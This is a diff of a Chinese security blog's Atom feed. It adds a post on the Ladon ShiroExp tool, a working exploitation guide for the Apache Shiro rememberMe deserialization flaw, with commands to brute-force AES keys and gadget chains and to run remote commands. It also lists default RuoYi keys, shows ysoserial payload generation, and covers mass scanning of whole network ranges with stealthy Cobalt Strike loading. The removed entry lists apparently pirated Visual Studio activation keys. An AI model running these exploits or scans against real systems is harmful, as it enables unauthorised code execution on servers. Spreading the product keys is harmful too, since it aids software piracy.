@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2024-11-28T15:32:43.778Z</updated>
+  <updated>2025-01-25T03:12:55.643Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -15,6 +15,44 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Ladon ShiroEXP高效爆破Key Shiro反序列化漏洞复现</title>
+    <link href="http://k8gege.org/p/shiroexp.html"/>
+    <id>http://k8gege.org/p/shiroexp.html</id>
+    <published>2024-12-10T15:40:00.000Z</published>
+    <updated>2025-01-25T03:12:55.643Z</updated>
+    
+    <content type="html"><![CDATA[<p style="color:#fff;"> <% <span class="archive-article-date">Visit <span id="busuanzi_value_page_pv"></span>%></%></p><p>Ladon ShiroEXP 高效爆破Key Shiro反序列化漏洞复现</p><h3 id="功能简介"><a href="#功能简介" class="headerlink" title="功能简介"></a>功能简介</h3><p>支持执行自定义payload (ysoserial)一键爆破Shiro Key 自动CBC/GCM 支持keys.txt多线程检测1100+仅需几十秒一键检测 反序列化 利用链Shiro高版本GCM回显命令执行(不出网)Shiro低版本CBC回显命令执行(不出网)输出ShiroExp.log</p><p>命令执行-回显利用链<br>CommonsCollectionsK2<br>CommonsBeanutils2<br>Jdk7u21<br>Jdk8u20<br>CommonsBeanutils1<br>CommonsCollectionsK1</p><p></p><h3 id="Shiro反序列化漏洞原理"><a href="#Shiro反序列化漏洞原理" class="headerlink" title="Shiro反序列化漏洞原理"></a>Shiro反序列化漏洞原理</h3><p>由于Apache Shiro cookie中通过 AES-128-CBC、AES-128-GCM 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><h3 id="爆破Shiro-Key"><a href="#爆破Shiro-Key" class="headerlink" title="爆破Shiro Key"></a>爆破Shiro Key</h3><p>内置1000+默认Key，多线程一键爆破(自动AES、GCM加密)，几秒验证<br>支持对Shiro-550（硬编码秘钥）和Shiro-721（Padding Oracle）的一键化检测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 check</span><br><span class="line">Ladon ShiroKey http://192.168.1.8</span><br></pre></td></tr></table></figure><p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/exp/shiro/key.png"></p><p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/exp/shiro/key2.png"></p><h3 id="爆破利用链"><a href="#爆破利用链" class="headerlink" title="爆破利用链"></a>爆破利用链</h3><p>内置1000+默认Key，多线程一键爆破(自动AES-CBC、AES-GCM加密)，几秒验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc check</span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm check</span><br></pre></td></tr></table></figure><p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/exp/shiro/gadget.png"></p><h3 id="ShiroEXP-漏洞利用"><a href="#ShiroEXP-漏洞利用" class="headerlink" title="ShiroEXP 漏洞利用"></a>ShiroEXP 漏洞利用</h3><p>使用爆破出来的对应利用链，无回显执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc CommonsBeanutils1 whoami</span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm CommonsBeanutils1 whoami</span><br></pre></td></tr></table></figure><p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/exp/shiro/exp.png"></p><h3 id="Rouyi-4-x漏洞利用"><a href="#Rouyi-4-x漏洞利用" class="headerlink" title="Rouyi 4.x漏洞利用"></a>Rouyi 4.x漏洞利用</h3><p>Rouyi4Exp只针对4.X默认Key(zSyK5Kp6PZAAjlT+eeNMlg==)，利用链CommonsBeanutils1的一键利用。对于其它版本，最好还是使用ShiroExp模块，这个针对所有使用Shiro框架的CMS</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ladon Rouyi4Exp http://192.168.1.8 whoami</span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc CommonsBeanutils1 whoami</span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm CommonsBeanutils1 whoami</span><br></pre></td></tr></table></figure><p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/exp/shiro/Rouyi4Exp.png"></p><h3 id="执行自定义payload"><a href="#执行自定义payload" class="headerlink" title="执行自定义payload"></a>执行自定义payload</h3><h4 id="ysoserial生成payload"><a href="#ysoserial生成payload" class="headerlink" title="ysoserial生成payload"></a>ysoserial生成payload</h4><p>Shiro利用链CommonsBeanutils1，所以payload必须使用CommonsBeanutils1封装，并不是任意class都能执行，要不然还爆破利用链的干嘛？因为目标引用了这个库，才能反序列化执行命令，并不是单纯知道KEY，就能执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">"touch /tmp/k8gege.txt"</span> &gt; yso.ser</span><br></pre></td></tr></table></figure><p>使用对应KEY 对应加密方式 执行payload 如shiro低版本 AES-CBC对应KEY加密，再发送加密后的cookie，所以这是为什么直接抓别人包，发送YSO生成payload无效的原因，一定要了解整个EXP通信原理，而不是表面理解，只知道通过remberME字段反序列化，可是让自己构造个payload，都不知道要封装成对应的，随意找个class当然不行啊，除非是原生JAVA，且支持所有java版本的class，明显没有，存在通用反序化payload的话就不需要ysoserial工具了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.50.223:8080 kPH+bIxk5D2deZiIxcaaaA== cbc diy yso.ser</span><br></pre></td></tr></table></figure><h4 id="检测是否执行成功"><a href="#检测是否执行成功" class="headerlink" title="检测是否执行成功"></a>检测是否执行成功</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.50.223:8080 kPH+bIxk5D2deZiIxcaaaA== cbc CommonsCollectionsK1 <span class="string">"ls /tmp"</span></span><br><span class="line"></span><br><span class="line">http://192.168.50.223:8080 IsShiro</span><br><span class="line">Exp...</span><br><span class="line">Res:</span><br><span class="line">hsperfdata_root</span><br><span class="line">k8gege.txt ---</span><br><span class="line">tomcat-docbase.6132634819123728545.8080</span><br><span class="line">tomcat.2080411627486188816.8080</span><br></pre></td></tr></table></figure><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Apache Shiro &lt; 1.2.4</span><br><span class="line"></span><br><span class="line">RuoYi 版本号 对象版本的默认AES密钥</span><br><span class="line">4.6.1-4.3.1 zSyK5Kp6PZAAjlT+eeNMlg==</span><br><span class="line">3.4-及以下 fCq+/xW488hMTCD+cmJ3aQ==</span><br></pre></td></tr></table></figure><h3 id="Shiro框架检测"><a href="#Shiro框架检测" class="headerlink" title="Shiro框架检测"></a>Shiro框架检测</h3><p>模块IsShiro，Cobalt Strike下命令用法一致,但无需上传EXE至目标，内存加载，隐蔽性高</p><h3 id="指定URL"><a href="#指定URL" class="headerlink" title="指定URL"></a>指定URL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon http://192.168.1.8 IsShiro</span><br></pre></td></tr></table></figure><h3 id="指定IP"><a href="#指定IP" class="headerlink" title="指定IP"></a>指定IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8 IsShiro</span><br></pre></td></tr></table></figure><h3 id="批量URL"><a href="#批量URL" class="headerlink" title="批量URL"></a>批量URL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon url.txt IsShiro</span><br></pre></td></tr></table></figure><p>PS：TXT可存放IP、IP:Port、URL等格式</p><h3 id="批量IP"><a href="#批量IP" class="headerlink" title="批量IP"></a>批量IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip.txt IsShiro</span><br><span class="line">Ladon noping ip.txt IsShiro</span><br></pre></td></tr></table></figure><h3 id="指定C段"><a href="#指定C段" class="headerlink" title="指定C段"></a>指定C段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/24 IsShiro</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/24 IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/24 IsShiro</span><br></pre></td></tr></table></figure><h3 id="指定B段"><a href="#指定B段" class="headerlink" title="指定B段"></a>指定B段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/b IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/b IsShiro</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/b IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/b IsShiro</span><br></pre></td></tr></table></figure><h3 id="指定A段"><a href="#指定A段" class="headerlink" title="指定A段"></a>指定A段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/a IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/a IsShiro</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/a IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/a IsShiro</span><br></pre></td></tr></table></figure><h3 id="批量C段"><a href="#批量C段" class="headerlink" title="批量C段"></a>批量C段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip24.txt IsShiro</span><br><span class="line">Ladon ipc.txt IsShiro</span><br><span class="line"></span><br><span class="line">Ladon noping ip24.txt IsShiro</span><br><span class="line">Ladon noping ipc.txt IsShiro</span><br></pre></td></tr></table></figure><p>PS: TXT存放多个目标的C段IP</p><h3 id="批量B段"><a href="#批量B段" class="headerlink" title="批量B段"></a>批量B段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip16.txt IsShiro</span><br><span class="line">Ladon noping ip16.txt IsShiro</span><br></pre></td></tr></table></figure><p>PS: TXT存放多个目标的B段IP</p><h3 id="批量网段"><a href="#批量网段" class="headerlink" title="批量网段"></a>批量网段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon cidr.txt IsShiro</span><br><span class="line">Ladon noping cidr.txt IsShiro</span><br></pre></td></tr></table></figure><p>PS: TXT存放各种IP网段，全网无差别扫描</p><h3 id="更多功能-使用教程"><a href="#更多功能-使用教程" class="headerlink" title="更多功能 使用教程"></a>更多功能 使用教程</h3><p><a href="http://k8gege.org/Ladon/">http://k8gege.org/Ladon/</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p style=&quot;color:#fff;&quot;&gt; 
+&lt;% &lt;span class=&quot;archive-article-date&quot;&gt;
+Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
+
+%&gt;
+&lt;/%&gt;&lt;/p&gt;
+
+
+&lt;p&gt;Ladon Shir
+      
+    
+    </summary>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+      <category term="EXP" scheme="http://k8gege.org/categories/EXP/"/>
+    
+    
+      <category term="EXP" scheme="http://k8gege.org/tags/EXP/"/>
+    
+      <category term="Shiro" scheme="http://k8gege.org/tags/Shiro/"/>
+    
+  </entry>
   
   <entry>
     <title>FortiManager CVE-2024-47575 RCE漏洞复现</title>
@@ -582,35 +620,6 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     
     
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>〖key〗VS2022 VS2019 VS2017最新注册码序列号</title>
-    <link href="http://k8gege.org/p/vsKey.html"/>
-    <id>http://k8gege.org/p/vsKey.html</id>
-    <published>2023-02-22T08:11:00.000Z</published>
-    <updated>2024-11-14T15:02:49.638Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="VS2022最新注册码"><a href="#VS2022最新注册码" class="headerlink" title="VS2022最新注册码"></a>VS2022最新注册码</h3><p>vs2022永久激活密钥:</p><p>Visual Studio 2022 Enterprise:VHF9H-NXBBB-638P6-6JHCY-88JWH  (K8成功)</p><p>Visual Studio 2022 Professional:TD244-P4NB7-YQ6XK-Y8MMM-YWV2J</p><p>Visual Studio 2019 Enterprise(K8成功)<br>BF8Y8-GN2QH-T84XB-QVY3B-RC4DF</p><p>Visual Studio 2019 Professional<br>NYWVH-HT4XC-R2WYW-9Y3CM-X4V3Y</p><p>Visual Studio 2017(VS2017)<br>企业版 Enterprise </p><p>注册码:NJVYC-BMHX2-G77MM-4XJMR-6Q8QF K8成功</p><p>VS 2015</p><p>企业版:<a href="http://download.microsoft.com/download/B/8/F/B8F1470D-2396-4E7A-83F5-AC09154EB925/vs2015.ent_chs.iso" target="_blank" rel="noopener">http://download.microsoft.com/download/B/8/F/B8F1470D-2396-4E7A-83F5-AC09154EB925/vs2015.ent_chs.iso</a><br>激活密钥:HM6NR-QXX7C-DFW2Y-8B82K-WTYJV</p><p>VS2013 产品密钥 – 所有版本</p><p><a href="http://download.microsoft.com/download/B/1/9/B1932B8C-1046-4773-A1DD-4AB5C0978637/vs2013.2_ult_chs.iso" target="_blank" rel="noopener">http://download.microsoft.com/download/B/1/9/B1932B8C-1046-4773-A1DD-4AB5C0978637/vs2013.2_ult_chs.iso</a></p><p>Visual Studio Ultimate 2013 KEY(密钥):BWG7X-J98B3-W34RT-33B3R-JVYW9  K8成功</p><p>Visual Studio Premium 2013 KEY(密钥):FBJVC-3CMTX-D8DVP-RTQCT-92494</p><p>Visual Studio Professional 2013  KEY(密钥): XDM3T-W3T3V-MGJWK-8BFVD-GVPKY</p><p>Team Foundation Server 2013 KEY(密钥):MHG9J-HHHX9-WWPQP-D8T7H-7KCQG</p><h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>History: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>9.1.1：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>10.8：K8小密圈</p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;VS2022最新注册码&quot;&gt;&lt;a href=&quot;#VS2022最新注册码&quot; class=&quot;headerlink&quot; title=&quot;VS2022最新注册码&quot;&gt;&lt;/a&gt;VS2022最新注册码&lt;/h3&gt;&lt;p&gt;vs2022永久激活密钥:&lt;/p&gt;
-&lt;p&gt;Visual Studio
-      
-    
-    </summary>
-    
-    
-      <category term="Key" scheme="http://k8gege.org/categories/Key/"/>
-    
-    
-      <category term="Vmware" scheme="http://k8gege.org/tags/Vmware/"/>
-    
-      <category term="Key" scheme="http://k8gege.org/tags/Key/"/>
     
   </entry>
   
